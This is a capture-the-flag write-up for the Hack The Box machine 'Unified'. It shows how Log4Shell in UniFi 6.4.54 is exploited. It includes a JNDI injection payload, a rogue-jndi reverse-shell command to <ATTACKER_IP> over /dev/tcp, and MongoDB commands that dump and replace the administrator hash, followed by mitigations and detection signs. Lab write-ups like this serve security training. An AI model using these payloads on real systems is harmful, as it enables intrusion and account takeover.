---
machine: Unified
os: Linux
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [log4shell, unifi, mongodb, linux, tier2]
---

# Unified — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Linux · Very Easy

## TL;DR

UniFi Network **6.4.54** on **8443/tcp** is vulnerable to **Log4Shell** (CVE-2021-44228) through the login `remember` parameter. `rogue-jndi` yields a shell as `unifi`; the local MongoDB (27117) stores the administrator hash and, after changing it, you log into the UniFi console and read the root flag.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
22/tcp   ssh
8080/tcp http   UniFi
8443/tcp ssl/http UniFi Network 6.4.54
```

- 8443 is the management UI; 8080 redirects.
- Version 6.4.54 bundles a vulnerable Log4j 2.x.

## Enumeration

```bash
curl -sk https://<TARGET_IP>:8443/status
```

This confirms the product and version. The login sends `remember=<value>` to `/api/login`, and that value reaches a `log4j` call:

```bash
curl -sk -X POST https://<TARGET_IP>:8443/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"x","remember":"${jndi:ldap://<ATTACKER_IP>:389/a}"}'
```

## Foothold

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package
java -jar target/RogueJndi-1.1.jar --command "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'" --hostname <ATTACKER_IP>
```

With `nc -lvnp 4444` listening, repeat the request and the shell arrives:

```text
unifi@unified:/usr/lib/unifi$
```

## Lateral movement

```bash
ps aux | grep mongo
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson)"
```

```text
{ "_id": ..., "name": "administrator", "x_shadow": "<HASH>" }
```

The hash is salted `sha512`; generate a new one and update it:

```bash
mongo --port 27117 ace --eval 'db.admin.update({name:"administrator"},{$set:{x_shadow:"<NEW_HASH>"}})'
```

## Privilege escalation

With the new password, sign in at `https://<TARGET_IP>:8443` as `administrator`. The UniFi console then gives the root flag; the user flag is in `/home/michael/user.txt`.

- There is no OS escalation: the control is administrative over the application.

## Evidence

- `/status` response with the version.
- Mongo query with the hash redacted.

## Lessons learned

- Log4Shell is still alive on unpatched appliances: one "remember" field is enough.
- `tcpdump -i tun0 port 389` confirms the JNDI callback before standing up LDAP.
- Appliances embed MongoDB on non-standard ports (27117) with default credentials.
- Replacing the hash in the database is a clean way to take the app without breaking it.

## Mitigations and detection

- Update UniFi and Log4j; `log4j2.formatMsgNoLookups=true` as a stopgap.
- Block outbound LDAP/RMI from the appliance.
- MongoDB on loopback with authentication and no default credentials.
- Detection: `${jndi:` in logs, outbound connections to 389/1389, `java` processes with `bash` children.

- CVE-2021-44228
- CWE-502, CWE-94
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1059.004](https://attack.mitre.org/techniques/T1059/004/)

## References

- [NVD — CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [rogue-jndi](https://github.com/veracode-research/rogue-jndi)
